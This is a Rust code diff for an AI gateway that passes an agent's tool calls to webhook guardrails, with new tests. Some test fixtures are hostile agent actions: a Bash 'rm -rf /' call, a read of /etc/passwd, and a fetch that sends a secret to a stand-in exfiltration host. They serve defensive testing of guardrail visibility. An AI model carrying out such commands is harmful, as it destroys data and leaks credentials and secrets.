@@ -5,6 +5,7 @@ use serde::{Deserialize, Serialize};
 
 use crate::types::{
 	OutputMessage, OutputMessagePart, RequestType, ResponseType, SimpleChatCompletionMessage,
+	ToolCall,
 };
 use crate::webhook::{Message, ResponseChoice};
 use crate::{AIError, InputFormat, LLMRequest, LLMRequestParams, LLMResponse};
@@ -113,6 +114,43 @@ pub struct Usage {
 	pub service_tier: Option<String>,
 	#[serde(flatten, default)]
 	pub rest: serde_json::Value,
+}
+
+/// Read a `tool_use` / `server_tool_use` block out of its raw JSON.
+///
+/// Both the request `ContentPart` and the response `Content` model text
+/// explicitly and dump every other block into an untyped value, so tool calls
+/// have to be recovered from JSON on both legs. Returns None for any other block
+/// (text, image, tool_result).
+fn tool_call_from_json(v: &serde_json::Value) -> Option<ToolCall> {
+	if !matches!(
+		v.get("type").and_then(|t| t.as_str()),
+		Some("tool_use" | "server_tool_use")
+	) {
+		return None;
+	}
+	Some(ToolCall {
+		id: strng::new(v.get("id").and_then(|x| x.as_str()).unwrap_or("")),
+		name: strng::new(v.get("name").and_then(|x| x.as_str()).unwrap_or("")),
+		arguments: v
+			.get("input")
+			.cloned()
+			.unwrap_or(serde_json::Value::Object(Default::default())),
+	})
+}
+
+/// Tool calls carried by one request message, in order.
+fn request_tool_calls(m: &RequestMessage) -> Vec<ToolCall> {
+	let Some(ContentBlock::Array(parts)) = m.content.as_ref() else {
+		return Vec::new();
+	};
+	parts
+		.iter()
+		.filter_map(|part| match part {
+			ContentPart::Unknown(v) => tool_call_from_json(v),
+			ContentPart::Text { .. } => None,
+		})
+		.collect()
 }
 
 pub fn get_messages_helper(
@@ -233,6 +271,29 @@ impl RequestType for Request {
 
 	fn get_messages(&self) -> Vec<SimpleChatCompletionMessage> {
 		get_messages_helper(&self.messages, &self.system)
+	}
+
+	fn get_webhook_messages(&self) -> Vec<Message> {
+		// `get_messages_helper` emits an optional leading system message followed
+		// by exactly one entry per request message, so the tail lines up
+		// positionally with `self.messages`. A system prompt never carries tool
+		// calls, hence the offset rather than a zip.
+		let simple = get_messages_helper(&self.messages, &self.system);
+		let system_offset = simple.len().saturating_sub(self.messages.len());
+		simple
+			.into_iter()
+			.enumerate()
+			.map(|(i, m)| {
+				let msg = Message::from(m);
+				match i
+					.checked_sub(system_offset)
+					.and_then(|j| self.messages.get(j))
+				{
+					Some(rm) => msg.with_tool_calls(request_tool_calls(rm)),
+					None => msg,
+				}
+			})
+			.collect()
 	}
 
 	fn set_messages(&mut self, messages: Vec<SimpleChatCompletionMessage>) {
@@ -467,6 +528,9 @@ impl ResponseType for Response {
 					message: Message {
 						role: "assistant".into(),
 						content: content.into(),
+						// A tool_use block has no `text`, so without this the whole
+						// choice was an empty string and the guard saw nothing.
+						tool_calls: tool_call_from_json(&c.rest).into_iter().collect(),
 					},
 				}
 			})
@@ -1191,6 +1255,21 @@ pub mod typed {
 						message: crate::webhook::Message {
 							role: "assistant".into(),
 							content: content.into(),
+							// Both variants, matching the untyped path's
+							// `tool_use | server_tool_use`.
+							tool_calls: match c {
+								ContentBlock::ToolUse {
+									id, name, input, ..
+								}
+								| ContentBlock::ServerToolUse {
+									id, name, input, ..
+								} => vec![crate::types::ToolCall {
+									id: agent_core::strng::new(id),
+									name: agent_core::strng::new(name),
+									arguments: input.clone(),
+								}],
+								_ => Vec::new(),
+							},
 						},
 					}
 				})
@@ -1216,7 +1295,7 @@ mod tests {
 	use super::*;
 	use crate::types::ResponseType;
 
-	fn make_typed_response_with_tool_use() -> typed::MessagesResponse {
+	pub(super) fn make_typed_response_with_tool_use() -> typed::MessagesResponse {
 		typed::MessagesResponse {
 			id: "msg_test".to_string(),
 			r#type: "message".to_string(),
@@ -1377,6 +1456,159 @@ mod tests {
 		assert_eq!(
 			tool_calls[0].arguments,
 			serde_json::json!({"location":"San Francisco"})
+		);
+	}
+}
+
+#[cfg(test)]
+mod webhook_tool_call_tests {
+	use super::*;
+	use crate::types::{RequestType, ResponseType};
+
+	/// The request leg carries conversation history, and an agentic history is
+	/// mostly tool_use / tool_result blocks. Before this, `get_messages_helper`
+	/// filtered content parts to text and a guardrail reviewing the transcript
+	/// saw narration with every action removed.
+	#[test]
+	fn request_surfaces_tool_use_from_history() {
+		let req: Request = serde_json::from_value(serde_json::json!({
+			"model": "claude-opus-4",
+			"system": "be careful",
+			"messages": [
+				{"role": "user", "content": "clean up the repo"},
+				{"role": "assistant", "content": [
+					{"type": "text", "text": "Running that now."},
+					{"type": "tool_use", "id": "toolu_1", "name": "Bash",
+					 "input": {"command": "rm -rf /"}}
+				]}
+			]
+		}))
+		.unwrap();
+
+		let msgs = req.get_webhook_messages();
+		// system + user + assistant
+		assert_eq!(msgs.len(), 3);
+		assert_eq!(msgs[0].role, "system");
+		assert!(msgs[0].tool_calls.is_empty());
+		assert!(msgs[1].tool_calls.is_empty(), "user turn has no tool calls");
+
+		let calls = &msgs[2].tool_calls;
+		assert_eq!(calls.len(), 1, "assistant tool_use must survive");
+		assert_eq!(calls[0].name, "Bash");
+		assert_eq!(calls[0].id, "toolu_1");
+		assert_eq!(
+			calls[0].arguments,
+			serde_json::json!({"command": "rm -rf /"})
+		);
+		// The text view is unchanged, so token counting is unaffected.
+		assert_eq!(msgs[2].content, "Running that now.");
+	}
+
+	/// No system prompt means no leading synthetic message; the offset used to
+	/// line messages up must follow.
+	#[test]
+	fn request_alignment_without_system_prompt() {
+		let req: Request = serde_json::from_value(serde_json::json!({
+			"messages": [
+				{"role": "assistant", "content": [
+					{"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": "/etc/passwd"}}
+				]}
+			]
+		}))
+		.unwrap();
+
+		let msgs = req.get_webhook_messages();
+		assert_eq!(msgs.len(), 1);
+		assert_eq!(msgs[0].tool_calls.len(), 1);
+		assert_eq!(msgs[0].tool_calls[0].name, "Read");
+	}
+
+	/// A text-only conversation must serialize exactly as before, so existing
+	/// webhooks see no change.
+	#[test]
+	fn text_only_request_omits_tool_calls_field() {
+		let req: Request = serde_json::from_value(serde_json::json!({
+			"messages": [{"role": "user", "content": "hello"}]
+		}))
+		.unwrap();
+
+		let msgs = req.get_webhook_messages();
+		let json = serde_json::to_value(&msgs[0]).unwrap();
+		assert_eq!(
+			json,
+			serde_json::json!({"role": "user", "content": "hello"})
+		);
+	}
+
+	/// The untyped response path: a tool_use block has no `text`, so the choice
+	/// used to be an empty string.
+	#[test]
+	fn response_surfaces_tool_use() {
+		let resp: Response = serde_json::from_value(serde_json::json!({
+			"id": "msg_1",
+			"type": "message",
+			"role": "assistant",
+			"model": "claude-opus-4",
+			"stop_reason": "tool_use",
+			"stop_sequence": null,
+			"usage": {"input_tokens": 1, "output_tokens": 2},
+			"content": [
+				{"type": "text", "text": "Let me check."},
+				{"type": "tool_use", "id": "toolu_9", "name": "WebFetch",
+				 "input": {"url": "https://exfil.example/?k=secret"}}
+			]
+		}))
+		.unwrap();
+
+		let choices = resp.to_webhook_choices();
+		assert_eq!(choices.len(), 2);
+		assert!(choices[0].message.tool_calls.is_empty());
+
+		let calls = &choices[1].message.tool_calls;
+		assert_eq!(calls.len(), 1);
+		assert_eq!(calls[0].name, "WebFetch");
+		assert_eq!(
+			calls[0].arguments,
+			serde_json::json!({"url": "https://exfil.example/?k=secret"})
+		);
+	}
+
+	/// The typed (Bedrock-shaped) response path, including `server_tool_use`.
+	#[test]
+	fn typed_response_surfaces_both_tool_use_variants() {
+		let resp = tests::make_typed_response_with_tool_use();
+		let choices = resp.to_webhook_choices();
+		assert_eq!(choices.len(), 3);
+		assert!(choices[0].message.tool_calls.is_empty(), "text block");
+		assert_eq!(choices[1].message.tool_calls[0].name, "get_weather");
+		assert_eq!(choices[2].message.tool_calls[0].name, "web_search");
+	}
+
+	/// Choice count must not change: `set_webhook_choices` bails on a mismatch,
+	/// so a mask round-trip would break if we collapsed or added choices.
+	#[test]
+	fn response_choice_count_is_stable_for_mask_roundtrip() {
+		let mut resp: Response = serde_json::from_value(serde_json::json!({
+			"id": "msg_1",
+			"type": "message",
+			"role": "assistant",
+			"model": "claude-opus-4",
+			"stop_reason": "tool_use",
+			"stop_sequence": null,
+			"usage": {"input_tokens": 1, "output_tokens": 2},
+			"content": [
+				{"type": "text", "text": "secret is abc"},
+				{"type": "tool_use", "id": "t", "name": "Bash", "input": {"command": "ls"}}
+			]
+		}))
+		.unwrap();
+
+		let mut choices = resp.to_webhook_choices();
+		choices[0].message.content = "secret is <REDACTED>".into();
+		resp.set_webhook_choices(choices).unwrap();
+		assert_eq!(
+			resp.content[0].text.as_deref(),
+			Some("secret is <REDACTED>")
 		);
 	}
 }
